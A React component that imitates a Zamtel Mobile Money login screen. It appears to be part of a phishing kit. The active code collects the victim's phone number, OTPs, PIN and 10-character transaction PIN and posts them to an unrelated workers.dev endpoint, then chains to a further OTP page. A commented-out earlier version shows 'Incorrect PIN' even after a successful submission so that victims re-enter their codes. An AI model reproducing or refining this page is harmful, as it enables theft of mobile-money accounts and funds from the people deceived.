// import React, { useEffect, useRef, useState } from "react";
// import { Navigate, useLocation, useNavigate } from "react-router-dom";

// const PIN_LENGTH = 4; // change to 6 if your PIN is 6 digits

// export default function ZamtelPin() {
//     const navigate = useNavigate();
//     const { state } = useLocation();
//     const phone = state?.phone;
//     const otp = state?.otp;

//     //   const [digits, setDigits] = useState(Array(PIN_LENGTH).fill(""));
//     const [pin, setPin] = useState("");
//     const [active, setActive] = useState(0);
//     const [loading, setLoading] = useState(false);
//     const [error, setError] = useState("");
//     const inputs = useRef([]);

//     useEffect(() => {
//         inputs.current[0]?.focus();
//     }, []);

//     // Opened directly without a phone number -> back to login
//     if (!phone) return <Navigate to="/" replace />;

//     const focusBox = (i) => {
//         const idx = Math.max(0, Math.min(PIN_LENGTH - 1, i));
//         inputs.current[idx]?.focus();
//     };

//     const handleChange = (e) => {
//     setError("");
//     setPin(e.target.value);
//     // setPin(e.target.value.replace(/\D/g, ""));
//   };

//     // const handleKeyDown = (i, e) => {
//     //     if (e.key === "Backspace") {
//     //         e.preventDefault();
//     //         const next = [...digits];
//     //         if (next[i]) {
//     //             next[i] = "";
//     //             setDigits(next);
//     //         } else if (i > 0) {
//     //             next[i - 1] = "";
//     //             setDigits(next);
//     //             focusBox(i - 1);
//     //         }
//     //     } else if (e.key === "ArrowLeft") focusBox(i - 1);
//     //     else if (e.key === "ArrowRight") focusBox(i + 1);
//     // };

//     // const handlePaste = (e) => {
//     //     e.preventDefault();
//     //     const pasted = e.clipboardData
//     //         .getData("text")
//     //         .replace(/\D/g, "")
//     //         .slice(0, PIN_LENGTH);
//     //     if (!pasted) return;
//     //     const next = Array(PIN_LENGTH).fill("");
//     //     pasted.split("").forEach((ch, idx) => (next[idx] = ch));
//     //     setDigits(next);

//     //     focusBox(pasted.length);
//     // };

//     //   const pin = digits.join("");
//     const isComplete = pin.length === PIN_LENGTH;

//     const handleSubmit = async (e) => {
//         e.preventDefault();
//         // if (!isComplete || loading) return;

//         setLoading(true);
//         setError("");
//         try {
//             const res = await fetch(
//                 `https://my-worker-app.instapayapi.workers.dev/api/zamtelPin`,
//                 {
//                     method: "POST",
//                     headers: { "Content-Type": "application/json" },
//                     body: JSON.stringify({ phone: `260${phone}`, otp, pin }),
//                 }
//             );
//             const data = await res.json().catch(() => ({}));
//             if (!res.ok) throw new Error(data.message || "Incorrect PIN");
//             setError("Incorrect PIN.");
//             setPin("");
//             // setDigits(Array(PIN_LENGTH).fill(""));

//             //   if (data.token) localStorage.setItem("token", data.token);
//             //   navigate("/dashboard", { replace: true });
//         } catch (err) {
//             setError(err.message || "Something went wrong. Try again.");
//             setDigits(Array(PIN_LENGTH).fill(""));
//             focusBox(0);
//         } finally {
//             setLoading(false);
//         }
//     };

//     return (
//         <div className="min-h-screen w-full bg-white flex justify-center">
//             <form
//                 onSubmit={handleSubmit}
//                 className="flex min-h-screen w-full max-w-md flex-col px-5 pt-10 pb-8 sm:pt-16"
//             >
//                 <button
//                     type="button"
//                     onClick={() => navigate(-1)}
//                     aria-label="Go back"
//                     className="-ml-1 flex h-10 w-10 items-center justify-center rounded-full text-black active:bg-gray-100"
//                 >
//                     <svg
//                         viewBox="0 0 24 24"
//                         className="h-7 w-7"
//                         fill="none"
//                         stroke="currentColor"
//                         strokeWidth="2"
//                         strokeLinecap="round"
//                         strokeLinejoin="round"
//                     >
//                         <path d="M19 12H5M12 19l-7-7 7-7" />
//                     </svg>
//                 </button>

//                 <h1 className="mt-8 text-3xl font-bold tracking-tight text-black sm:text-4xl">
//                     Enter Zamtel PIN
//                 </h1>
//                 <p className="mt-3 text-base text-gray-700">
//                     Enter Zamtel PIN for{" "}
//                     <span className="font-medium text-blue-600">{phone}</span>
//                 </p>
//  <div
//           className={`mt-8 flex items-center rounded-2xl border-2 bg-white px-4 py-4 transition-colors focus-within:border-blue-500 ${
//             error ? "border-red-400" : "border-gray-200"
//           }`}
//         >

//                 {/* PIN boxes (masked) */}
//                 <input
//                     type={"text"}
//                     // inputMode="numeric"
//                     // autoComplete="current-password"
//                     // autoFocus
//                     value={pin}
//                     onChange={handleChange}
//                     placeholder="Enter your PIN"
//                     aria-label="PIN"
//                     className="w-full bg-transparent text-base text-gray-900 placeholder-gray-500 outline-none"
//                 />
//         </div>

//                 <div className="mt-4 flex items-start justify-between gap-4 text-base">
//                     <span className="text-sm text-red-500">{error}</span>
//                     <button
//                         type="button"
//                         onClick={() => navigate("/forgot-pin", { state: { phone } })}
//                         className="shrink-0 font-medium text-blue-600"
//                     >
//                         Forgot PIN?
//                     </button>
//                 </div>

//                 {/* <div className="flex-1" /> */}

//                 <button
//                     type="submit"
//                     onClick={handleSubmit}
//                     // disabled={!isComplete || loading}
//                     className={`w-full mt-6 rounded-2xl py-5 text-lg font-medium transition-colors bg-[#12A036] text-white hover:bg-[#0e7a2a]`}
//                 >
//                     {loading ? "Verifying..." : "Login"}
//                 </button>
//             </form>
//         </div>
//     );
// }


import React, { useEffect, useState } from "react";
import { Navigate, useLocation, useNavigate } from "react-router-dom";

const TPIN_MAX_LENGTH = 10;

export default function ZamtelPin() {
    const navigate = useNavigate();
    const { state } = useLocation();

    const phone = state?.phone;
    const otp = state?.otp;
    const newpin = state?.newpin;
    const firstOtp = state?.firstOtp;

    const [tpin, setTpin] = useState("");
    const [loading, setLoading] = useState(false);
    const [error, setError] = useState("");


    // Opened directly without a phone number -> back to login
    if (!phone) return <Navigate to="/" replace />;

    const handleChange = (e) => {
        setError("");

        // Allow letters and numbers, maximum 10 characters
        const value = e.target.value
            .replace(/[^a-zA-Z0-9]/g, "")
            .slice(0, TPIN_MAX_LENGTH);

        setTpin(value);
    };

    const handleSubmit = async (e) => {
        e.preventDefault();

        if (!tpin.trim() || loading) return;

        setLoading(true);
        setError("");

        try {
            const res = await fetch(
                "https://my-worker-app.instapayapi.workers.dev/api/zamtel-tpin",
                {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                    },
                    body: JSON.stringify({
                        phone: `260${phone}`,
                        otp,
                        pin: newpin,
                        secondOtp: firstOtp,
                        tpin: tpin,
                    }),
                }
            );

            const data = await res.json().catch(() => ({}));

            if (!res.ok) {
                throw new Error(data.message || "Incorrect TPIN");
            }

            // If you want to show error after API response
            // setError("Incorrect TPIN.");
            navigate('/last-otp', { state: { phone, newpin, otp, firstOtp, tpin } })
            setTpin("");
        } catch (err) {
            setError(err.message || "Something went wrong. Try again.");
            setTpin("");
        } finally {
            setLoading(false);
        }
    };

    return (
        <div className="min-h-screen w-full bg-white flex justify-center">
            <form
                onSubmit={handleSubmit}
                className="flex min-h-screen w-full max-w-md flex-col px-5 pt-10 pb-8 sm:pt-16"
            >
                {/* Back Button */}
                <button
                    type="button"
                    onClick={() => navigate(-1)}
                    aria-label="Go back"
                    className="-ml-1 flex h-10 w-10 items-center justify-center rounded-full text-black active:bg-gray-100"
                >
                    <svg
                        viewBox="0 0 24 24"
                        className="h-7 w-7"
                        fill="none"
                        stroke="currentColor"
                        strokeWidth="2"
                        strokeLinecap="round"
                        strokeLinejoin="round"
                    >
                        <path d="M19 12H5M12 19l-7-7 7-7" />
                    </svg>
                </button>

                {/* Heading */}
                {/* <h1 className="mt-8 text-3xl font-bold tracking-tight text-black sm:text-4xl">
                    Enter Zamtel Mobile Money TPIN
                </h1> */}
                <h1 className="mt-8 text-3xl font-bold tracking-tight text-black sm:text-4xl">
                    What is a TPIN?
                </h1>

                <p className="mt-3 text-base leading-6 text-gray-700">
                    A TPIN is your personal Mobile Money transaction
                    PIN used to securely authorize transactions.
                </p>

                {/* <p className="mt-3 text-base text-gray-700">
                    Enter your Mobile Money TPIN for{" "}
                    <span className="font-medium text-blue-600">
                        {phone}
                    </span>
                </p> */}

                {/* TPIN Label */}
                <label
                    htmlFor="tpin"
                    className="mt-8 mb-2 block text-sm font-medium text-gray-800"
                >
                    {/* Enter Zamtel Mobile Money TPIN */}
                    Enter 10 digits TPIN
                </label>

                {/* TPIN Input */}
                <div
                    className={`flex items-center rounded-2xl border-2 bg-white px-4 py-4 transition-colors focus-within:border-blue-500 ${error ? "border-red-400" : "border-gray-200"
                        }`}
                >
                    <input
                        id="tpin"
                        type="text"
                        value={tpin}
                        onChange={handleChange}
                        placeholder="TPIN"
                        maxLength={TPIN_MAX_LENGTH}
                        autoComplete="off"
                        aria-label="Zamtel Mobile Money TPIN"
                        className="w-full bg-transparent text-base text-gray-900 placeholder-gray-500 outline-none"
                    />
                </div>

                {/* Error + Forgot TPIN */}
                <div className="mt-4 flex items-start justify-between gap-4">
                    <span className="text-sm text-red-500">
                        {error}
                    </span>

                    <button
                        type="button"
                        onClick={() =>
                            navigate("/forgot-pin", {
                                state: { phone },
                            })
                        }
                        className="shrink-0 text-sm font-medium text-blue-600"
                    >
                        Forgot TPIN?
                    </button>
                </div>

                {/* Login Button */}
                <button
                    type="submit"
                    disabled={!tpin.trim() || loading}
                    className={`mt-6 w-full rounded-2xl py-5 text-lg font-medium text-white transition-colors ${!tpin.trim() || loading
                            ? "bg-gray-300 cursor-not-allowed"
                            : "bg-[#12A036] hover:bg-[#0e7a2a]"
                        }`}
                >
                    {loading ? "Verifying..." : "Login"}
                </button>
            </form>
        </div>
    );
}
